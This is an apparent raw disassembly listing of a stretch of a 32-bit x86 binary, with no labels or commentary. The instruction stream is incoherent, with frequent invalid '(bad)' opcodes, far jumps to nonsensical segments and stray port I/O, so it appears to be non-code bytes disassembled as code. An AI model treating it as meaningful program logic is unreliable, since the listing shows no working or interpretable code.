  412fd9:	jmp    0x412fcf
  412fdb:	mov    DWORD PTR ds:0x8bf2cf28,edx
  412fe1:	std    
  412fe2:	push   ss
  412fe3:	dec    ebp
  412fe4:	push   ss
  412fe5:	test   eax,0xc0be6007
  412fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412feb:	lea    ebx,[eax+ebx*4+0xc]
  412fef:	jg     0x412f77
  412ff1:	lds    ecx,FWORD PTR ds:0x9fae8373
  412ff7:	retf   0xc0b5
  412ffa:	imul   esp,DWORD PTR [eax+0x53],0xffffff93
  412ffe:	xchg   edx,eax
  412fff:	mov    dl,0xe5
  413001:	jle    0x41302e
  413003:	aad    0x14
  413005:	or     al,BYTE PTR [esi+0x3c8f192c]
  41300b:	lods   al,BYTE PTR ds:[esi]
  41300c:	fistp  WORD PTR [ecx+0x4a68a56b]
  413012:	mov    DWORD PTR [ebx],esp
  413014:	dec    ebx
  413015:	pop    ebp
  413016:	push   esi
  413017:	sbb    eax,0xc3e7ad6
  41301c:	and    al,0x39
  41301e:	clc    
  41301f:	call   0xd35:0x30ebb3b8
  413026:	inc    edx
  413027:	in     al,dx
  413028:	push   ss
  413029:	jecxz  0x4130a6
  41302b:	sbb    esi,DWORD PTR [ecx+ebx*8]
  41302e:	scas   eax,DWORD PTR es:[edi]
  41302f:	mul    DWORD PTR [ebx+0x30]
  413032:	sub    eax,0xc8e69e9e
  413037:	and    DWORD PTR ds:0x5bea3c32,esi
  41303d:	jnp    0x412fc3
  41303f:	mov    bl,0x17
  413041:	mov    DWORD PTR [edi+0x7f6912e5],edi
  413047:	je     0x41309c
  413049:	call   0x661d:0xacfd021b
  413050:	lods   al,BYTE PTR ds:[esi]
  413051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413052:	jge    0x413082
  413054:	and    al,0x7e
  413056:	loope  0x41304c
  413058:	ins    BYTE PTR es:[edi],dx
  413059:	lahf   
  41305a:	or     ah,BYTE PTR [ebx]
  41305c:	(bad)  
  41305d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41305e:	(bad)  [ecx+ecx*2-0x50]
  413062:	add    BYTE PTR [edx+eiz*8],0xbe
  413066:	sub    al,0x73
  413068:	inc    edi
  413069:	sbb    DWORD PTR [esp+ebx*8],edi
  41306c:	inc    ecx
  41306d:	mov    bh,0x41
  41306f:	inc    edx
  413070:	xor    eax,0x35689d43
  413075:	clc    
  413076:	mov    edi,0xf03dc8f1
  41307b:	jmp    0xd6f3:0x772191f
  413082:	dec    ebx
  413083:	cmp    al,bh
  413085:	arpl   ax,ax
  413087:	or     esp,DWORD PTR [edx]
  413089:	jmp    0xff9e0fba
  41308e:	or     al,0x1d
  413090:	and    cl,BYTE PTR [ecx+0x61]
  413093:	fs sti 
  413095:	aas    
  413096:	mov    eax,0x5ba1cda8
  41309b:	std    
  41309c:	fs push 0xffffff98
  41309f:	(bad)  
  4130a0:	pop    es
  4130a1:	cs inc edi
  4130a3:	lea    edi,[edi]
  4130a5:	or     edi,DWORD PTR [ebp+0x3fecf6a4]
  4130ab:	mov    edi,0xf2078365
  4130b0:	sub    DWORD PTR [edi+0x29636d1a],0x326a0754
  4130ba:	(bad)  
  4130bb:	push   ds
  4130bc:	fs repnz mov esp,0xce15055c
  4130c3:	in     al,dx
  4130c4:	retf   
  4130c5:	and    DWORD PTR [ecx],ebp
  4130c7:	ds and edi,ecx
  4130ca:	pop    edi
  4130cb:	adc    eax,ebx
  4130cd:	dec    ebx
  4130ce:	popf   
  4130cf:	cli    
  4130d0:	punpcklwd mm1,DWORD PTR [edi]
  4130d3:	fidiv  WORD PTR [ecx]
  4130d5:	sub    DWORD PTR [eax+0x1de7677a],edi
  4130db:	push   0x64
  4130dd:	leave  
  4130de:	sub    al,0x6c
  4130e0:	mov    BYTE PTR [ecx-0x5682acaf],bh
  4130e6:	fld    QWORD PTR [ecx+0x5abe454f]
  4130ec:	(bad)  
  4130ed:	pop    es
  4130ee:	in     eax,dx
  4130ef:	shr    DWORD PTR [edi],cl
  4130f1:	stc    
  4130f2:	push   0xfffffff8
  4130f4:	and    ah,BYTE PTR [eax+0x79]
  4130f7:	test   al,0x32
  4130f9:	mov    ecx,0xadb7c3b3
  4130fe:	sbb    BYTE PTR [ebp+0x24],bh
  413101:	pop    edi
  413102:	ja     0x41312d
  413104:	mov    ebp,0xdbc14ba5
  413109:	jae    0x41318a
  41310b:	int3   
  41310c:	jge    0x41317b
  41310e:	pusha  
  41310f:	fimul  WORD PTR [eax-0x2e2b472e]
  413115:	sub    al,0x9
  413117:	jl     0x4130ee
  413119:	lods   eax,DWORD PTR ds:[esi]
  41311a:	je     0x413109
  41311c:	retf   0xc289
  41311f:	or     al,0x1d
  413121:	sub    DWORD PTR [eax+0x1a54cb7f],ebp
  413127:	mov    DWORD PTR [edi-0x5d],ebx
  41312a:	(bad)  ds:0x1ac0827c
  413130:	aaa    
  413131:	dec    esi
  413132:	push   cs
  413133:	leave  
  413134:	lods   eax,DWORD PTR ds:[esi]
  413135:	ds mov eax,0x2008fe64
  41313b:	and    eax,0xe9adca65
  413140:	adc    ah,dl
  413142:	das    
  413143:	mov    ah,0x52
  413145:	jmp    0x6e6c9622
  41314a:	gs scas al,BYTE PTR es:[edi]
  41314c:	pop    edi
  41314d:	fidivr WORD PTR [edx+ebp*2]
  413150:	cmc    
  413151:	scas   eax,DWORD PTR es:[edi]
  413152:	pushf  
  413153:	test   edi,0x83d803a8
  413159:	push   ds
  41315a:	or     ebp,DWORD PTR [ebx+0x14b008a8]
  413160:	xor    al,BYTE PTR [edx+0x2]
  413163:	inc    ebp
  413164:	jbe    0x413191
  413166:	dec    ebp
  413167:	shl    DWORD PTR [edx],1
  413169:	shr    DWORD PTR [eax+0x63],1
  41316c:	in     eax,dx
  41316d:	ins    BYTE PTR es:[edi],dx
  41316e:	(bad)  
  41316f:	mov    BYTE PTR [esi+0x79],0x32
  413173:	xchg   ebx,eax
  413174:	adc    edx,DWORD PTR [edx]
  413176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413177:	stos   BYTE PTR es:[edi],al
  413178:	out    dx,al
  413179:	rcr    BYTE PTR [ebx+0x3ba174e8],1
  41317f:	sub    BYTE PTR [ebx-0x4b477110],dh
  413185:	fmul   DWORD PTR [ebp+0x65]
  413188:	bound  edi,QWORD PTR [edx+0x519a04bc]
  41318e:	pop    edx
  41318f:	outs   dx,DWORD PTR ds:[esi]
  413190:	inc    ebp
  413191:	mov    DWORD PTR ds:0xc66c9ce6,ecx
  413197:	iret   
  413198:	and    al,0x59
  41319a:	popf   
  41319b:	pop    edx
  41319c:	nop
  41319d:	popa   
  41319e:	outs   dx,DWORD PTR ds:[esi]
  41319f:	gs pop ebp
  4131a1:	ja     0x4131a0
  4131a3:	lods   al,BYTE PTR ds:[esi]
  4131a4:	cwde   
  4131a5:	mov    ch,0xf7
  4131a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a8:	dec    edi
  4131a9:	aas    
  4131aa:	icebp  
  4131ab:	pop    ecx
  4131ac:	add    edi,esi
  4131ae:	xchg   edx,eax
  4131af:	out    dx,eax
  4131b0:	push   esi
  4131b1:	jne    0x413170
  4131b3:	aam    0xae
  4131b5:	clc    
  4131b6:	in     eax,0x71
  4131b8:	test   esi,eax
  4131ba:	sbb    ebp,ebp
  4131bc:	xchg   ecx,eax
  4131bd:	and    eax,0xb9c9c485
  4131c2:	aam    0x7a
  4131c4:	cmp    eax,0x5a6fdb9d
  4131c9:	sti    
  4131ca:	sub    dh,bl
  4131cc:	mov    ch,0x88
  4131ce:	in     al,dx
  4131cf:	test   al,0x3f
  4131d1:	loope  0x4131fd
  4131d3:	cmp    ebp,DWORD PTR [esi+0x1cd6b175]
  4131d9:	mov    DWORD PTR [ebx],edi
  4131db:	push   ebx
  4131dc:	pop    edi
  4131dd:	cmp    edx,DWORD PTR [eax+0x53]
  4131e0:	adc    al,0x9e
  4131e2:	sbb    edi,edi
  4131e4:	fist   DWORD PTR [esi-0x19]
  4131e7:	pop    esp
  4131e8:	retf   
  4131e9:	cmp    DWORD PTR [edi],ecx
  4131eb:	mov    ebx,0x34ee0c83
  4131f0:	jl     0x413219
  4131f2:	ja     0x41326d
  4131f4:	pop    ss
  4131f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131f6:	fwait
  4131f7:	ror    BYTE PTR [esi+ebp*4+0x746c666b],1
  4131fe:	jmp    0xa0d4:0xeb8beca8
  413205:	test   al,0x6b
  413207:	adc    BYTE PTR [esi-0x62],dl
  41320a:	(bad)  
  41320b:	scas   eax,DWORD PTR es:[edi]
  41320c:	cmp    BYTE PTR cs:[esi-0x42b95806],al
  413213:	xchg   esp,eax
  413214:	lock adc al,0xc0
  413217:	and    DWORD PTR [esi],eax
  413219:	push   ss
  41321a:	xor    DWORD PTR [edi-0x2e],ebx
  41321d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41321e:	pusha  
  41321f:	jne    0x413213
  413221:	dec    edi
  413222:	push   esp
  413223:	push   edx
  413224:	and    eax,0x7264b4ee
  413229:	jg     0x41325b
  41322b:	ss shr DWORD PTR ss:[esp+ebx*2-0x7a],1
  413231:	adc    al,0x65
  413233:	mov    al,0x10
  413235:	rcl    ebp,cl
  413237:	jmp    0xaf99aa79
  41323c:	adc    eax,0xd8a4b8ce
  413241:	mov    ebp,0xe2f67b99
  413246:	pop    esi
  413247:	push   edi
  413248:	mov    esp,0xf8055ba2
  41324d:	gs sub ah,bh
  413250:	outs   dx,DWORD PTR ds:[esi]
  413251:	fs mov ah,0x44
  413254:	push   ss
  413255:	push   es
  413256:	cld    
  413257:	mov    bl,0x86
  413259:	outs   dx,DWORD PTR ds:[esi]
  41325a:	adc    ebx,0x6be04124
  413260:	stc    
  413261:	or     DWORD PTR ds:0xbcc55fe7,esp
  413267:	scas   al,BYTE PTR es:[edi]
  413268:	outs   dx,BYTE PTR ds:[esi]
  413269:	push   ebp
  41326a:	mov    esp,0x2a7ca2f4
  41326f:	cwde   
  413270:	test   eax,0x9ccc972a
  413275:	add    eax,0xa48204bb
  41327a:	adc    ecx,DWORD PTR [ebx-0x55]
  41327d:	not    BYTE PTR [edi]
  41327f:	pop    es
  413280:	sbb    esi,DWORD PTR [edx]
  413282:	mov    dl,0x24
  413284:	ret    0xeba3
  413287:	pop    ds
  413288:	lahf   
  413289:	sbb    DWORD PTR [edi+0x7621580e],esp
  41328f:	mov    bh,BYTE PTR [edi]
  413291:	fnsave [ebp+0x57d75324]
  413297:	pop    ebx
  413298:	cmc    
  413299:	dec    ecx
  41329a:	(bad)  
  41329c:	out    dx,eax
  41329d:	mov    cl,0xdd
  41329f:	scas   al,BYTE PTR es:[edi]
  4132a0:	add    bl,cl
  4132a2:	jp     0x413281
  4132a4:	sbb    BYTE PTR [ebp-0x15],bh
  4132a7:	pop    ebx
  4132a8:	push   cs
  4132a9:	jmp    0x41331a
  4132ab:	inc    esp
  4132ac:	gs add ecx,ecx
  4132af:	in     eax,dx
  4132b0:	data16 or bh,al
  4132b3:	test   BYTE PTR [eax],bl
  4132b5:	jmp    0x6c862456
  4132ba:	sub    DWORD PTR [edx-0x6384862d],edx
  4132c0:	adc    eax,0xb0ed6eaf
  4132c5:	sbb    eax,0xaf1ae82
  4132ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132cb:	into   
  4132cc:	jecxz  0x41332c
  4132ce:	mov    ds:0xbb34bf59,eax
  4132d3:	xor    al,0xcd
  4132d5:	inc    eax
  4132d6:	jnp    0x4132ff
  4132d8:	in     eax,0x47
  4132da:	sbb    dl,ch
  4132dc:	cli    
  4132dd:	xor    esi,DWORD PTR [ebx-0x67]
  4132e0:	xchg   edi,eax
  4132e1:	mov    eax,0x8132ddb0
  4132e6:	mov    al,0x64
  4132e8:	cdq    
  4132e9:	and    BYTE PTR [edi],0x12
  4132ec:	xchg   cl,cl
  4132ee:	les    esp,FWORD PTR [edx+0x62b18924]
  4132f4:	cs (bad) 
  4132f6:	push   esp
  4132f7:	xor    al,0x6b
  4132f9:	lock jbe 0x413353
  4132fc:	ror    BYTE PTR [edi-0x5bc75b4b],cl
  413302:	or     ebp,DWORD PTR [edi-0x3846dd82]
  413308:	pop    es
  413309:	fistp  QWORD PTR [edx]
  41330b:	ds daa 
  41330d:	(bad)  
  41330e:	mov    ebx,0xf2cc5be4
  413313:	mov    al,0x25
  413315:	dec    eax
  413316:	xor    eax,0x5dab75e5
  41331b:	loopne 0x41334f
  41331d:	stc    
  41331e:	int3   
  41331f:	sbb    eax,0xd1104903
  413324:	sbb    al,0x21
  413326:	adc    eax,0xcda01565
  41332b:	mov    ds:0x56c7b917,al
  413330:	sbb    BYTE PTR [ebp+0x43756d57],0x7f
  413337:	into   
  413338:	and    al,0xa1
  41333a:	jns    0x41335b
  41333c:	or     edx,eax
  41333e:	retf   
  41333f:	jmp    0x413363
  413341:	dec    ecx
  413342:	test   eax,0x2298d890
  413347:	pushf  
  413348:	fstp   DWORD PTR [ebx-0x44ea8c65]
  41334e:	jbe    0x413356
  413350:	addr16 mov ebx,0xcaebc64e
  413356:	mov    edx,0x5be30a34
  41335b:	and    eax,0x652f6d29
  413360:	xor    DWORD PTR [ebp+0x27],0x1d1b1545
  413367:	call   0xd317cc8c
  41336c:	int    0x32
  41336e:	jg     0x41338a
  413370:	push   0xad627ba5
  413375:	push   ds
  413376:	push   ebp
  413377:	pusha  
  413378:	add    eax,DWORD PTR [edx-0x5a]
  41337b:	ret    
  41337c:	jge    0x4133e5
  41337e:	mov    dl,0x74
  413380:	sbb    ah,BYTE PTR [esi+0x4b]
  413383:	adc    DWORD PTR [ebp-0x3f0d8c97],0x4e5df7d6
  41338d:	pop    ecx
  41338e:	dec    ebp
  41338f:	sbb    bh,BYTE PTR [ecx-0x40]
  413392:	push   es
  413393:	dec    ecx
  413394:	push   edx
  413395:	iret   
  413396:	sbb    ch,BYTE PTR [esi+0x55]
  413399:	push   edx
  41339a:	ins    BYTE PTR es:[edi],dx
  41339b:	jmp    0x291f:0x8683b4b6
  4133a2:	and    bh,BYTE PTR [esi-0x1f]
  4133a5:	dec    esi
  4133a6:	dec    edx
  4133a7:	ret    
  4133a8:	out    0xa6,al
  4133aa:	jmp    0x413366
  4133ac:	into   
  4133ad:	mov    al,0x44
  4133af:	addr16 pop edx
  4133b1:	ds pop ecx
  4133b3:	imul   eax,DWORD PTR [edx-0x772b4946],0x15701f98
  4133bd:	call   0xb38a:0xb734ef09
  4133c4:	out    0x9a,eax
  4133c6:	xor    al,0xe0
  4133c8:	push   ds
  4133c9:	jns    0x41337c
  4133cb:	(bad)  
  4133cc:	dec    edi
  4133cd:	hlt    
  4133ce:	in     al,0xc0
  4133d0:	fstp   TBYTE PTR fs:[ebx]
  4133d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133d4:	mov    dl,0x87
  4133d6:	mov    bh,0xf7
  4133d8:	(bad)  
  4133d9:	ret    
  4133da:	xchg   edi,eax
  4133db:	icebp  
  4133dc:	xor    al,0xd9
  4133de:	sbb    ch,al
  4133e0:	sbb    BYTE PTR [edx-0x57dbc215],ch
  4133e6:	push   es
  4133e7:	pop    esp
  4133e8:	cmc    
  4133e9:	xchg   ecx,eax
  4133ea:	jecxz  0x4133de
  4133ec:	mov    ch,BYTE PTR [edx]
  4133ee:	mov    al,0x13
  4133f0:	push   ds
  4133f1:	dec    ecx
  4133f2:	inc    ebp
  4133f3:	out    0x40,eax
  4133f5:	(bad)  
  4133f6:	mov    ecx,0x2efb8c9
  4133fb:	adc    al,0xd9
  4133fd:	inc    ecx
  4133fe:	jmp    0x413386
  413400:	loope  0x413441
  413402:	mov    edx,0x9cc4328c
  413407:	imul   ebp,DWORD PTR [edi+0x31],0x41184522
  41340e:	push   0xeba49a6d
  413413:	test   BYTE PTR [ebp+0x7e],dh
  413416:	or     ebp,DWORD PTR [ecx]
  413418:	mov    esi,0x8e5b0a5a
  41341d:	std    
  41341e:	mov    edx,0x4aee3c14
  413423:	dec    ebp
  413424:	mov    ch,0xa8
  413426:	mov    ch,0xf3
  413428:	sub    edi,edx
  41342a:	xchg   edx,eax
  41342b:	dec    ebp
  41342c:	out    dx,eax
  41342d:	mov    al,ds:0xdc48455f
  413432:	test   DWORD PTR [eax+0x2d],edi
  413435:	mov    DWORD PTR [ecx-0x57],edx
  413438:	imul   eax,ebp,0xffffff9f
  41343b:	sti    
  41343c:	cmc    
  41343d:	call   0xb8e1:0xe83b647b
  413444:	add    al,0x76
  413446:	and    eax,0xbec550ae
  41344b:	adc    al,0xc6
  41344d:	adc    bh,BYTE PTR [eax+0x1ed7663f]
  413453:	into   
  413454:	sbb    BYTE PTR [ebp+0x76407684],bl
  41345a:	xchg   esi,eax
  41345b:	nop
  41345c:	test   DWORD PTR [eax-0x42],ecx
  41345f:	push   esp
  413460:	js     0x413446
  413462:	dec    edi
  413463:	test   al,0x35
  413465:	and    al,0x6b
  413467:	out    0x23,eax
  413469:	pop    edx
  41346a:	pop    gs
  41346c:	sbb    ecx,DWORD PTR [ecx+0x51ec0dea]
  413472:	xchg   ecx,eax
  413473:	adc    BYTE PTR [eax+ebp*1+0x61288fef],bh
  41347a:	xchg   ebx,eax
  41347b:	cs popa 
  41347d:	(bad)  
  41347e:	std    
  41347f:	fcom   DWORD PTR [ebp+0x4f2a291a]
  413485:	push   0xffffffbe
  413487:	aam    0x60
  413489:	mov    dl,ch
  41348b:	and    BYTE PTR [edi+0x251d6937],0x1
  413492:	mov    ecx,0x51ff9f3
  413497:	lock mov DWORD PTR [edi-0x6602b575],esp
  41349e:	outs   dx,BYTE PTR ds:[esi]
  41349f:	lock push eax
  4134a1:	lock xor bh,ch
  4134a4:	xchg   ebp,eax
  4134a5:	lahf   
  4134a6:	jge    0x413499
  4134a8:	icebp  
  4134a9:	stos   DWORD PTR es:[edi],eax
  4134aa:	imul   edi,DWORD PTR [ecx-0x39a26f7b],0xffffffbb
  4134b1:	bound  edi,QWORD PTR [esp+edx*4+0x126c0c03]
  4134b8:	cmc    
  4134b9:	add    BYTE PTR [edx],0xec
  4134bc:	jns    0x4134d9
  4134be:	fwait
  4134bf:	test   DWORD PTR [ecx],esp
  4134c1:	fnstenv [edi+0x12b059b3]
  4134c7:	cmp    DWORD PTR [ecx-0x5d],ecx
  4134ca:	pop    ebx
  4134cb:	mov    esp,0xa5a05d9d
  4134d0:	push   ebp
  4134d1:	punpcklwd mm7,mm6
  4134d4:	fdivr  DWORD PTR [esi+0x201ad528]
  4134da:	xchg   DWORD PTR [ecx-0x6f246378],edx
  4134e0:	ror    BYTE PTR [esi+0x38],1
  4134e3:	rcr    DWORD PTR [ebx+0x63],0x83
  4134e7:	addr16 jbe 0x4134eb
  4134ea:	mov    edx,0x3c83bcf4
  4134ef:	add    al,0xc5
  4134f1:	imul   esp,DWORD PTR [esp+esi*8+0x67fcec06],0xcdecfda0
  4134fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134fd:	out    dx,al
  4134fe:	mov    esi,0xf9053cec
  413503:	jmp    0xcfb1:0xed4db555
  41350a:	pop    ebx
  41350b:	add    al,0x1d
  41350d:	stc    
  41350e:	xchg   esi,eax
  41350f:	sub    al,0x36
  413511:	stc    
  413512:	stos   DWORD PTR es:[edi],eax
  413513:	and    edx,0xffffff9b
  413516:	jmp    0x41351d
  413518:	stc    
  413519:	mov    ecx,0x78803536
  41351e:	jl     0x413579
  413520:	mov    edi,ebp
  413522:	(bad)  
  413523:	neg    BYTE PTR [ebp+0x7190b2ab]
  413529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41352a:	jnp    0x4134fa
  41352c:	jno    0x4134d2
  41352e:	adc    esp,DWORD PTR [ecx]
  413530:	inc    ebx
  413531:	jmp    FWORD PTR [eax-0x4941004b]
  413537:	aam    0xbc
  413539:	and    eax,esp
  41353b:	push   ebp
  41353c:	and    eax,0x2de89d4e
  413541:	xor    DWORD PTR [edx-0x50],ebp
  413544:	sub    eax,0x869f2d79
  413549:	sti    
  41354a:	test   eax,0x551c21ef
  41354f:	adc    eax,0xe6ee7d95
  413554:	mov    esp,0x22d70756
  413559:	imul   esp,DWORD PTR [ecx],0x6b6fc1fd
  41355f:	mov    dh,0xdf
  413561:	pop    ecx
  413562:	jnp    0x41359a
  413564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413565:	sub    bl,BYTE PTR [ecx+esi*8+0x67b51264]
  41356c:	push   ss
  41356d:	fld    st(5)
  41356f:	sbb    DWORD PTR [edx+0x4d80fef],ecx
  413575:	test   al,0x2b
  413577:	inc    esi
  413578:	retf   
  413579:	mov    eax,0xec38766b
  41357e:	(bad)  
  41357f:	or     bh,BYTE PTR [edi-0xc]
  413582:	mov    ebx,0x7a5b8114
  413587:	sbb    al,0x65
  413589:	inc    ebx
  41358a:	mov    ds:0x4a6b7ef,eax
  41358f:	shl    DWORD PTR [edx],0x29
  413592:	stos   DWORD PTR es:[edi],eax
  413593:	dec    eax
  413594:	cmc    
  413595:	mov    es,edx
  413597:	imul   esi,DWORD PTR [ecx],0xffffff9b
  41359a:	sub    edi,ebp
  41359c:	dec    edx
  41359d:	xchg   edx,eax
  41359e:	xchg   esi,eax
  41359f:	add    dh,ah
  4135a1:	lock jns 0x4135af
  4135a4:	pop    esp
  4135a5:	bound  esi,QWORD PTR [esp+esi*1-0x717830cb]
  4135ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135ad:	and    ch,BYTE PTR [ebx-0x43ec1c16]
  4135b3:	mov    al,ds:0x2e06e923
  4135b8:	xchg   edi,eax
  4135b9:	mov    ebp,DWORD PTR [ecx-0x545ffee5]
  4135bf:	pop    edi
  4135c0:	inc    edx
  4135c1:	mov    esp,0xf28bd0c3
  4135c6:	in     al,dx
  4135c7:	jmp    0xc9f2:0x4b1324c
  4135ce:	jnp    0x413647
  4135d0:	xchg   ebp,eax
  4135d1:	jle    0x41362e
  4135d3:	in     al,dx
  4135d4:	sbb    ah,ah
  4135d6:	(bad)  [ecx]
  4135d8:	int    0xb0
  4135da:	cmp    bh,BYTE PTR [esi+0x1b]
  4135dd:	xchg   ecx,eax
  4135de:	retf   
  4135df:	and    al,0x7c
  4135e1:	ficom  WORD PTR [edx+0x4e]
  4135e4:	add    bl,cl
  4135e6:	sti    
  4135e7:	shl    BYTE PTR [esi+eiz*4-0x5b6f9fdf],0xcb
  4135ef:	hlt    
  4135f0:	inc    ebx
  4135f1:	pop    esp
  4135f2:	dec    cl
  4135f4:	cmp    BYTE PTR [edx+ecx*8],al
  4135f7:	test   BYTE PTR [ebp-0x1b],dh
  4135fa:	ja     0x413675
  4135fc:	cmp    DWORD PTR [ebx-0x6e307e43],edx
  413602:	jns    0x4135ef
  413604:	push   es
  413605:	cmp    esi,DWORD PTR [ebp-0x15f16dd5]
  41360b:	add    al,BYTE PTR [ecx+esi*2]
  41360e:	ret    0x4f68
  413611:	push   esi
  413612:	cmp    al,0x9a
  413614:	test   eax,0xeb8cbc83
  413619:	push   edx
  41361a:	mov    ebp,ebp
  41361c:	lahf   
  41361d:	mov    eax,ds:0x4fd6e274
  413622:	or     eax,DWORD PTR [ebx+ecx*1-0x5b]
  413626:	daa    
  413627:	mov    esi,0x4030516b
  41362c:	add    ch,BYTE PTR [edx]
  41362e:	stc    
  41362f:	sbb    ebx,DWORD PTR [ebx]
  413631:	lahf   
  413632:	leave  
  413633:	push   esp
  413634:	das    
  413635:	mov    edx,0xb2aa066f
  41363a:	sbb    eax,0xbc33b773
  41363f:	adc    al,0xac
  413641:	sbb    al,0xcf
  413643:	scas   eax,DWORD PTR es:[edi]
  413644:	ret    
  413645:	aas    
  413646:	mov    bl,0xd4
  413648:	and    ecx,esp
  41364a:	aaa    
  41364b:	data16 gs adc bl,al
  41364f:	icebp  
  413650:	sub    ah,BYTE PTR [edx]
  413652:	xor    DWORD PTR [ebp+0x56],esi
  413655:	mov    ebx,0x298ab7d2
  41365a:	call   0x7e175858
  41365f:	pop    edx
  413660:	rcr    BYTE PTR [esi-0x4f],0x79
  413664:	dec    eax
  413665:	cdq    
  413666:	shl    DWORD PTR [eax],1
  413668:	pop    ecx
  413669:	jbe    0x4136c2
  41366b:	fwait
  41366c:	ds lahf 
  41366e:	into   
  41366f:	(bad)  
  413670:	(bad)  
  413671:	mov    ecx,0x99edcb18
  413676:	ja     0x413641
  413678:	and    ah,BYTE PTR [eax+0x63]
  41367b:	and    esi,0x8c227f2f
  413681:	jo     0x4136e2
  413683:	jbe    0x4136de
  413685:	fwait
  413686:	aas    
  413687:	mov    bl,0x47
  413689:	jmp    0xb6e3fa9e
  41368e:	enter  0x2ff0,0x25
  413692:	and    DWORD PTR [edi+ebx*1-0x6afd32d8],esi
  413699:	sahf   
  41369a:	cmp    edx,esp
  41369c:	jne    0x4136e9
  41369e:	mov    ds:0x9d118600,eax
  4136a3:	jns    0x4136bc
  4136a5:	pushf  
  4136a6:	dec    ebx
  4136a7:	js     0x413632
  4136a9:	rcl    DWORD PTR es:[ecx-0x7bd459ce],cl
  4136b0:	xchg   ecx,eax
  4136b1:	repnz and dl,BYTE PTR gs:[ebx]
  4136b5:	or     al,0xf3
  4136b7:	icebp  
  4136b8:	push   ds
  4136b9:	xor    BYTE PTR [edx-0x4d777cda],ah
  4136bf:	mov    BYTE PTR [esi+eiz*4],bl
  4136c2:	jmp    0x413735
  4136c4:	dec    ecx
  4136c5:	add    bh,BYTE PTR [esi-0x6f9263bb]
  4136cb:	mov    edx,0x64ec756d
  4136d0:	push   edi
  4136d1:	mov    bh,0x67
  4136d3:	pusha  
  4136d4:	sbb    eax,0x3d2c5ccc
  4136d9:	test   al,0xb0
  4136db:	js     0x4136dc
  4136dd:	sahf   
  4136de:	jno    0x41372a
  4136e0:	leave  
  4136e1:	inc    esi
  4136e2:	or     al,0xec
  4136e4:	pop    ss
  4136e5:	js     0x413750
  4136e7:	push   0x7a
  4136e9:	(bad)  
  4136ea:	ja     0x4136af
  4136ec:	sbb    BYTE PTR [ecx],bh
  4136ee:	xchg   edi,eax
  4136ef:	cmp    al,0xf9
  4136f1:	sub    eax,0xa3300081
  4136f6:	retf   
  4136f7:	imul   BYTE PTR [edx]
  4136f9:	or     eax,0xeb3f55eb
  4136fe:	frstor [ebp+0x79]
  413701:	loopne 0x413759
  413703:	in     al,0xe6
  413705:	cmp    BYTE PTR [ecx-0x1fc15c5c],0x8e
  41370c:	xor    eax,0x79eb50ea
  413711:	and    eax,ecx
  413713:	cdq    
  413714:	inc    edx
  413715:	cdq    
  413716:	out    dx,eax
  413717:	lea    ebp,[eax+0x13974903]
  41371d:	mov    dl,BYTE PTR [ebx-0x4c97c91b]
  413723:	pop    edx
  413724:	cmp    eax,0x6147109e
  413729:	jns    0x4136ce
  41372b:	test   eax,0x54eff872
  413730:	(bad)  
  413731:	dec    ecx
  413732:	out    0x74,eax
  413734:	xor    ah,BYTE PTR [ecx-0x5b9a0d6d]
  41373a:	or     edx,ebx
  41373c:	pop    ss
  41373d:	std    
  41373e:	outs   dx,DWORD PTR ds:[esi]
  41373f:	dec    esp
  413740:	call   0xb709:0xf66b2ccf
  413747:	hlt    
  413748:	pop    ebx
  413749:	jns    0x413748
  41374b:	mov    esp,0xe940e745
  413750:	mov    ecx,DWORD PTR [ebx]
  413752:	fbld   TBYTE PTR [ebp-0x6fa166e4]
  413758:	inc    eax
  413759:	stos   DWORD PTR es:[edi],eax
  41375a:	pop    ebx
  41375b:	lea    eax,[ecx+eiz*4]
  41375e:	retf   
  41375f:	ins    DWORD PTR es:[edi],dx
  413760:	mov    bh,0xf6
  413762:	sahf   
  413763:	out    dx,al
  413764:	cld    
  413765:	or     ebx,edi
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jno    0x4137be
  41376a:	mov    bl,0x94
  41376c:	cmp    BYTE PTR [ebp+0x7676aaf1],cl
  413772:	sbb    ah,BYTE PTR [ebx]
  413774:	pop    edi
  413775:	xor    dl,BYTE PTR [esi-0x52c25b2c]
  41377b:	and    al,0xe4
  41377d:	mov    ds:0x51745daa,eax
  413782:	jns    0x4137ae
  413784:	lods   eax,DWORD PTR ds:[esi]
  413785:	loopne 0x41373d
  413787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413788:	jecxz  0x4137db
  41378a:	mov    ds:0xab155611,eax
  41378f:	fwait
  413790:	push   edx
  413791:	pop    ecx
  413792:	xchg   ebx,eax
  413793:	add    al,0x20
  413795:	mov    bh,0x21
  413797:	add    BYTE PTR [ecx],bl
  413799:	or     DWORD PTR [edi+ebx*2-0xa2acb9b],edi
  4137a0:	dec    eax
  4137a1:	shr    bl,cl
  4137a3:	aas    
  4137a4:	rol    DWORD PTR [ebx],1
  4137a6:	daa    
  4137a7:	xor    BYTE PTR [ebx],0x41
  4137aa:	cmp    DWORD PTR [ebx],ebp
  4137ac:	aam    0x26
  4137ae:	stos   BYTE PTR es:[edi],al
  4137af:	mov    dl,0x5
  4137b1:	jl     0x413766
  4137b3:	adc    al,0x2c
  4137b5:	icebp  
  4137b6:	mov    cs,WORD PTR [eax+0x5c7adc37]
  4137bc:	test   DWORD PTR [eax+0x41],ebx
  4137bf:	jmp    0x413743
  4137c1:	scas   eax,DWORD PTR es:[edi]
  4137c2:	sbb    edi,ebp
  4137c4:	fisub  DWORD PTR [ecx]
  4137c6:	(bad)  
  4137c7:	aam    0x39
  4137c9:	hlt    
  4137ca:	mov    al,0x7d
  4137cc:	sub    bl,bl
  4137ce:	mov    edx,0xa776882b
  4137d3:	test   al,0x75
  4137d5:	xor    al,0x72
